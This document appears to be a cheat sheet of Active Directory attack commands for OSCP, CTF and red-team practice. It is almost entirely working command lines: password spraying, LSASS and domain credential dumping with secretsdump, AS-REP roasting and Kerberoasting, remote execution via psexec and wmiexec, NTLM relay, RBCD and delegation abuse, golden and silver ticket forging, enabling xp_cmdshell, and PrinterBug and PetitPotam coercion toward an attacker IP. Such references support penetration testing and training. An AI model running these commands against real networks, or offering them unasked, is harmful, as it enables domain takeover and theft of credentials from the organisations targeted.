# Active Directory & Impacket Mega Cheat Sheet (OSCP / CTF / Red Team)

## Active Directory & Impacket Mega Cheat Sheet (OSCP / CTF / Red Team)

***

## 1. Initial Network Enumeration

### SMB

```
nmap -p445 --script smb-protocols <target>
nmap --script smb-enum-shares -p445 <target>
nmap --script smb-enum-users -p445 <target>
nmap --script smb-os-discovery -p445 <target>
```

### NetExec / CrackMapExec style

```
nxc smb <target> -u users.txt -p passwords.txt
nxc smb <target> -u user -p pass --shares
nxc smb <target> -u user -p pass --sessions
nxc smb <target> -u user -p pass --loggedon-users
nxc smb <target> -u user -p pass --pass-pol
nxc smb <target> -u user -p pass --local-groups
nxc smb <target> -u user -p pass -M lsassy
```

***

## 2. SMB Access (Impacket)

```
impacket-smbclient domain/user:pass@target
impacket-smbclient -k domain/user@target
impacket-smbclient domain/user@target -hashes LM:NT
```

Mount share manually

```
smbclient //target/share -U user
```

***

## 3. RPC Enumeration

```
impacket-rpcdump domain/user:pass@target
impacket-samrdump domain/user:pass@target
impacket-lookupsid domain/user:pass@target
```

***

## 4. Kerberos Enumeration

### Get TGT

```
impacket-getTGT domain/user:password
impacket-getTGT domain/user -hashes LM:NT
```

### Convert ticket

```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

Export ticket

```
export KRB5CCNAME=ticket.ccache
```

***

## 5. AS-REP Roasting

```
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat
impacket-GetNPUsers domain.local/ -dc-ip <dc> -request
```

***

## 6. Kerberoasting

```
impacket-GetUserSPNs domain/user:password
impacket-GetUserSPNs domain/user:password -request
impacket-GetUserSPNs domain/user:password -request -outputfile hashes.txt
impacket-GetUserSPNs domain.local/user -hashes LM:NT -request
```

***

## 7. Remote Command Execution

### PsExec

```
impacket-psexec domain/user:password@target
impacket-psexec -hashes LM:NT domain/user@target
```

### WMIExec

```
impacket-wmiexec domain/user:password@target
impacket-wmiexec -hashes LM:NT domain/user@target
impacket-wmiexec -nooutput domain/user:password@target
```

### SMBExec

```
impacket-smbexec domain/user:password@target
impacket-smbexec -hashes LM:NT domain/user@target
```

### DCOMExec

```
impacket-dcomexec domain/user:password@target
```

### ATExec

```
impacket-atexec domain/user:password@target "whoami"
```

***

## 8. Credential Dumping

### Secretsdump

```
impacket-secretsdump domain/user:password@dc
impacket-secretsdump domain/user@dc -hashes LM:NT
impacket-secretsdump -just-dc domain/user:password@dc
impacket-secretsdump -just-dc-ntlm domain/user:password@dc
```

Offline dump

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

***

## 9. NTLM Relay

```
impacket-ntlmrelayx -t smb://target
impacket-ntlmrelayx -t ldap://dc
impacket-ntlmrelayx -t ldaps://dc --delegate-access
impacket-ntlmrelayx -smb2support
impacket-ntlmrelayx --remove-mic
```

***

## 10. Machine Account Abuse

Create machine

```
impacket-addcomputer domain/user:pass -computer-name attacker$ -computer-pass Pass123!
```

Delete machine

```
impacket-addcomputer domain/admin:pass -delete -computer-name attacker$
```

***

## 11. RBCD (Resource Based Constrained Delegation)

Write delegation

```
impacket-rbcd -delegate-from attacker$ -delegate-to DC01$ -action write domain/user:pass
```

Check configuration

```
impacket-rbcd -delegate-to DC01$ -action read domain/user:pass
```

***

## 12. Kerberos Delegation Attacks

Get Service Ticket

```
impacket-getST domain/user:pass -spn cifs/server
impacket-getST domain/user:pass -impersonate administrator -spn host/server
```

***

## 13. Golden Ticket

```
impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain domain.local administrator
```

***

## 14. Silver Ticket

```
impacket-ticketer -nthash SERVICE_HASH -domain-sid SID -spn cifs/server domain.local
```

***

## 15. BloodHound Collection

```
bloodhound-python -u user -p pass -d domain.local -ns dc-ip -c all
```

NetExec collection

```
nxc ldap dc-ip -u user -p pass --bloodhound --collection All
```

***

## 16. LDAP Enumeration

```
ldapsearch -x -H ldap://dc -D "user@domain.local" -w password -b "dc=domain,dc=local"
```

Impacket

```
impacket-ldapsearch domain/user:pass@dc
```

***

## 17. MSSQL Attacks

Connect

```
impacket-mssqlclient domain/user:pass@target
```

Enable cmdshell

```
EXEC sp_configure 'xp_cmdshell', 1
```

Execute command

```
xp_cmdshell whoami
```

***

## 18. DNS Abuse

Add DNS record

```
impacket-dnstool domain/user:pass -r attacker.domain.local -a add -d 10.10.14.5
```

***

## 19. PrinterBug / Coercion

```
python3 printerbug.py domain/user:pass@target attacker-ip
```

PetitPotam

```
python3 PetitPotam.py domain/user:pass attacker-ip target
```

***

## 20. Common AD PrivEsc Paths

GenericWrite abuse

```
impacket-rbcd
addspn.py
setspn
```

ACL abuse

```
dacledit.py
bloodyAD
```
